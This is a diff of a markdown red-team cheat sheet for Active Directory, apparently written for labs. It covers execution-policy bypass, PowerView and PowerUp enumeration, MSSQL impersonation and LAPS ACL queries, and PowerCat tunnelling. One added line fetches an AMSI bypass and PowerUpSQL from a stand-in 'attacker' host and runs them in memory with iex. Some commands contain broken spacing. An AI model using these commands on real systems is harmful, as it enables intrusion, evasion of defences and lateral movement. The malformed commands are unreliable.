@@ -60,7 +60,7 @@ PS C:\Users\demiidk\Documents\> PowerShell.exe -ExecutionPolicy UnRestricted -Fi
 PS C:\Users\demiidk\Documents\> PowerShell.exe -ExecutionPolicy Remote-signed -File .\PowerView.ps1
 ```
 
-When you are able to import or execute script you can use PowerView or ActiveDirectory module to start to enumerating your system.
+When you are able to import or execute script you can use PowerView or ActiveDirectory module to start to enumerating the environment.
 
 <br>
 
@@ -74,16 +74,6 @@ PS C:\Users\demiidk\Documents\> whoami /GROUPS
 
 ```
 PS C:\Users\demiidk\Documents\> Import-Module .\PowerUp.ps1; Invoke-AllChecks
-```
-
-### Importing Active Directory Module.
-
-```
-PS C:\Users\demiidk\Documents\> Import-Module .\Microsoft.ActiveDirectory.dll -Verbose
-```
-
-```
-PS C:\Users\demiidk\Documents\> Import-Module .\ActiveDirectory.psd1
 ```
 <br>
 
@@ -161,6 +151,22 @@ PS C:\Users\demiidk\Documents\> Invoke-AllChecks
 
 >:warning: Don't try to get domain admin user quickly, rarely you can own a domain admin account.
 
+### Importing Active Directory Module.
+
+```
+PS C:\Users\demiidk\Documents\> Import-Module .\Microsoft.ActiveDirectory.dll -Verbose
+```
+
+```
+PS C:\Users\demiidk\Documents\> Import-Module .\ActiveDirectory.psd1
+```
+
+### Importing PowerView
+
+```
+PS C:\Users\demiidk\Documents\> Import-Module .\PowerView.ps1
+```
+
 Enumerate all GPOs using "Restircted Groups"
 
 > :information_source: A Restricted Group is an object to represent a local group in a computer.
@@ -205,22 +211,50 @@ Test if MSSQL is accessible:
 PS C:\Users\demiidk\Documents\> Get-SQLConnectionTest -Instance SQLSRV01\SQL -Verbose
 ```
 
+Check if the current SQL Login user can impersonate others:
+
+```
+PS C:\Users\demiidk\Documents\> Get-SQLQuery -Instance LAB-SQLSRV01\SQL -Query 'SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = ''IMPERSONATE'''"
+```
+
+Enumerate if LAPS is used in any machine.
+
+```
+PS C:\Users\demiidk\Documents\> Get-DomainOU | Get- DomainObjectAcl -ResolveGUIDs | Where- Object {($_.ObjectAceType -like 'ms-Mcs- AdmPwd') -and ($_.ActiveDirectoryRights - match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_}
+```
+
+Enumerate if GSAD is deployed:
+
+
+
+Execute SQL Query on memory:
+
+```
+powershell -c "iex (iwr -UseBasicParsing http://attacker/amsibypass.txt);iex (iwr -UseBasicParsing http://attacker/powerupsql.ps1);Get-SQLQuery -Instance LAB-SQLSRV01\SQL -Query 'Select * from DATABASE'"
+```
+
+
+
 ## Step 04 - Lateral Movement.
 
-### Tunneling with PowerCat
+### Tunneling with PowerCat (Require administrative privileges)
 
-Attacker -> Compromised -> Target
+Attacker -> Compromised:1773 -> Target:1433
 
-```
-PowerShell on Compromsided:
-
-PS C:\Users\demiidk\Documents\> powercat -l -p 1306 -r tcp:Target:1306 -v 
-```
-
-Target -> Compromised -> Attacker
+![](2022-11-02-19-51-16.png)
 
 ```
 PowerShell on Compromsided:
 
-PS C:\Users\demiidk\Documents\> powercat -l -p 1306 -r tcp:Attacker:1306 -v 
+PS C:\Users\demiidk\Documents\> powercat -l -p 1773 -r tcp:Target:1433 -v 
+```
+<br>
+Target -> Compromised:443 -> Attacker:443
+
+![](2022-11-02-19-57-14.png)
+
+```
+PowerShell on Compromsided:
+
+PS C:\Users\demiidk\Documents\> powercat -l -p 1773 -r tcp:Attacker:443 -v 
 ```
